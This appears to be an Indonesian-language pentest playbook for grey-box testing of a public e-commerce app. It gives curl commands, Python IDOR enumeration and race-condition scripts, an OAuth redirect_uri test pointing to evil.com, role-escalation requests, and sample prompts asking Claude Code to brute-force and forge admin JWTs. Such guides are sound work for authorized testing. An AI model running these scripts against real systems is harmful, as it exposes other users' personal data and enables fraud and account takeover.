# Skenario 8: Aplikasi Internet Publik — Grey Box

**Akses:** Internet publik  
**Metode:** Grey Box — punya akun user terdaftar, sebagian dokumentasi API  
**Contoh target:** `https://www.targetapp.co.id` + akun `testuser@gmail.com:Test1234!`

---

## Informasi Awal yang Tersedia

| Item | Status |
|------|--------|
| URL target | ✓ |
| Akun user terdaftar | ✓ (user role) |
| Dokumentasi API publik | ✓ Sebagian (Swagger, Postman collection) |
| Teknologi stack | ✓ Sebagian |
| Source code | ✗ |
| Akun admin | ✗ |

---

## Kenapa Grey Box Sangat Efektif untuk Aplikasi Internet

1. **API documentation** sering tersedia publik di apps modern
2. **Akun user** membuka seluruh fitur authenticated
3. **JWT/OAuth tokens** bisa dianalisis lebih dalam
4. **IDOR** sangat umum di API aplikasi publik besar
5. **Lebih realistis** — simulasi penyerang yang registrasi sendiri

---

## Phase 1: API Documentation Harvesting

```bash
# Cari dokumentasi API publik
curl -s https://www.targetapp.co.id/swagger.json
curl -s https://www.targetapp.co.id/swagger-ui/
curl -s https://www.targetapp.co.id/api/docs
curl -s https://www.targetapp.co.id/api-docs
curl -s https://api.targetapp.co.id/v1/docs

# Import ke Postman untuk testing
# Atau gunakan swagger-cli
npm install -g @apidevtools/swagger-cli
swagger-cli validate https://www.targetapp.co.id/api-docs
```

**Prompt Claude Code:**
```
Grey box pentest https://www.targetapp.co.id.
Saya memiliki akun user biasa dan berhasil menemukan Swagger docs:

[PASTE SWAGGER/OPENAPI JSON ATAU DESKRIPSI ENDPOINT]

Analisis semua endpoint dan identifikasi:
1. Endpoint yang mengakses resource ber-ID (rawan IDOR)
2. Endpoint yang seharusnya hanya untuk admin (dari naming/parameter)
3. Endpoint yang mengembalikan data sensitif
4. Parameter yang tidak tervalidasi dengan baik
5. Buat test plan terurut dari prioritas tertinggi
```

---

## Phase 2: Authentication & Token Analysis

### JWT Analysis

```python
# Decode dan analisis JWT
import base64, json

def analyze_jwt(token):
    try:
        parts = token.split('.')
        # Decode header
        header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        
        # Decode payload
        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        
        print("=== JWT ANALYSIS ===")
        print(f"Algorithm: {header.get('alg')} {'⚠️ VULNERABLE (none attack)' if header.get('alg') == 'none' else ''}")
        print(f"Type: {header.get('typ')}")
        print(f"\nPayload claims:")
        for key, val in payload.items():
            sensitivity = "🔴" if key in ['role', 'admin', 'is_admin', 'permissions'] else "📌"
            print(f"  {sensitivity} {key}: {val}")
        
        return header, payload
    except Exception as e:
        print(f"Error: {e}")

# Dapatkan token dari browser DevTools > Network > Authorization header
token = input("Paste JWT token: ")
analyze_jwt(token)
```

**Prompt Claude Code:**
```
JWT dari https://www.targetapp.co.id setelah login:

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {
  "user_id": 1042,
  "email": "testuser@gmail.com", 
  "role": "user",
  "subscription": "free",
  "exp": 1735689600
}

Analisis dan buatkan exploit attempts:
1. Apakah bisa ubah role: "user" → "admin"?
2. Apakah bisa ubah subscription: "free" → "premium"?
3. Apakah algoritma HS256 dengan secret lemah bisa di-crack?
4. Buatkan script hashcat/john untuk bruteforce JWT secret
5. Jika secret ditemukan, forge token admin
```

### OAuth Token Testing

```bash
# Intercept OAuth flow di Burp Suite
# Cek: redirect_uri manipulation, state parameter, token leakage

# Test redirect_uri bypass
curl "https://www.targetapp.co.id/oauth/authorize?\
  client_id=app123&\
  redirect_uri=https://evil.com&\  # Ubah redirect
  response_type=code&\
  scope=openid profile"

# Test state parameter (CSRF check)
# Hapus atau ubah state → apakah error?
```

---

## Phase 3: IDOR Testing pada Aplikasi Internet

```python
# vulnerabilities/idor_internet.py
import requests
import json

BASE = "https://www.targetapp.co.id"
HEADERS = {
    "Authorization": "Bearer <JWT_TOKEN>",
    "Content-Type": "application/json"
}

# Data dari akun kita sendiri
MY_USER_ID = 1042
MY_ORDER_ID = 8875

def test_idor_user_profiles():
    """Test akses profil user lain"""
    findings = []
    # Test ID di sekitar ID kita (user yang recently registered)
    for uid in range(MY_USER_ID - 20, MY_USER_ID + 20):
        if uid == MY_USER_ID:
            continue
        resp = requests.get(f"{BASE}/api/v1/users/{uid}", headers=HEADERS)
        if resp.status_code == 200:
            data = resp.json()
            findings.append({
                "user_id": uid,
                "name": data.get('name'),
                "email": data.get('email'),
                "phone": data.get('phone')
            })
            print(f"[IDOR] User {uid}: {data.get('email')}")
    return findings

def test_idor_orders():
    """Test akses order/transaksi user lain"""
    for oid in range(MY_ORDER_ID - 50, MY_ORDER_ID + 50):
        resp = requests.get(f"{BASE}/api/v1/orders/{oid}", headers=HEADERS)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('user_id') != MY_USER_ID:  # Order milik orang lain!
                print(f"[IDOR] Order {oid} milik user {data.get('user_id')}: {json.dumps(data, indent=2)}")

print("[*] Testing IDOR User Profiles...")
test_idor_user_profiles()
print("\n[*] Testing IDOR Orders...")
test_idor_orders()
```

---

## Phase 4: Business Logic Testing (E-Commerce / SaaS Context)

**Prompt Claude Code:**
```
Grey box pentest pada https://targetapp.co.id (platform e-commerce).
Saya login sebagai user biasa dengan akun gratis.

Fitur yang terlihat:
- Profil dan pengaturan akun
- Daftar pesanan saya
- Review produk
- Chat dengan seller
- Upgrade ke premium

Buatkan test case business logic:
1. Dapatkah saya akses pesanan user lain? (IDOR)
2. Dapatkah saya membuat review tanpa membeli produk?
3. Dapatkah saya manipulasi harga saat checkout (parameter tampering)?
4. Dapatkah saya menggunakan fitur premium tanpa bayar?
   (ubah parameter subscription di request)
5. Dapatkah saya kirim pesan ke seller atas nama user lain?
6. Race condition: checkout dengan stok 1 dari 2 browser sekaligus?
```

### Race Condition Testing

```python
# Burp Suite Intruder atau script Python untuk race condition
import requests
import threading

def checkout_attempt(session, results, idx):
    resp = session.post(
        "https://targetapp.co.id/api/checkout",
        json={"item_id": 999, "quantity": 1, "coupon": "HALF50"}
    )
    results[idx] = resp.json()

# Buat 10 request paralel untuk klaim coupon 1x
results = [None] * 10
threads = [threading.Thread(target=checkout_attempt, 
           args=(requests.Session(), results, i)) for i in range(10)]

# Start semua sekaligus
for t in threads:
    t.start()
for t in threads:
    t.join()

# Cek berapa yang berhasil (seharusnya hanya 1)
successes = [r for r in results if r and r.get('status') == 'success']
print(f"Berhasil checkout: {len(successes)}/10 (race condition jika > 1)")
```

---

## Phase 5: Privilege Escalation via API

```bash
# Test endpoint admin tanpa otentikasi admin
curl -H "Authorization: Bearer <USER_JWT>" \
  https://targetapp.co.id/api/admin/users

# Manipulasi role di request body
curl -X PUT \
  -H "Authorization: Bearer <USER_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin"}' \
  https://targetapp.co.id/api/v1/profile

# Test HTTP method override
curl -X POST \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer <USER_JWT>" \
  https://targetapp.co.id/api/v1/users/999
```

---

## Checklist Grey Box Internet

```
[ ] Login dan capture JWT/session token
[ ] Temukan dan analisis dokumentasi API (Swagger, Postman)
[ ] Decode dan analisis JWT claims
[ ] Test JWT signature bypass / weak secret
[ ] Test OAuth redirect_uri manipulation
[ ] IDOR testing pada semua resource endpoint
[ ] Business logic testing sesuai fitur aplikasi
[ ] Race condition pada endpoint kritis (coupon, stok, payment)
[ ] Mass assignment testing pada semua PUT/PATCH
[ ] Privilege escalation via API manipulation
[ ] Test rate limiting (brute force, spam)
[ ] Test file upload jika ada
[ ] Laporan dengan PoC video/screenshot
```

---

## Reporting untuk Aplikasi Internet (Bug Bounty Style)

**Prompt Claude Code:**
```
Buatkan bug report dalam format bug bounty untuk temuan IDOR:

Endpoint: GET /api/v1/orders/{id}
My Order ID: 8875
Accessed Order ID: 8820 (milik user lain)
Data exposed: nama, alamat, no HP, detail produk, total bayar

Format laporan harus include:
- Summary (1 kalimat)
- Steps to reproduce (numbered)
- Expected behavior
- Actual behavior
- Impact (data yang terekspos)
- CVSS score
- Proof of concept (curl command)
- Recommended fix
```
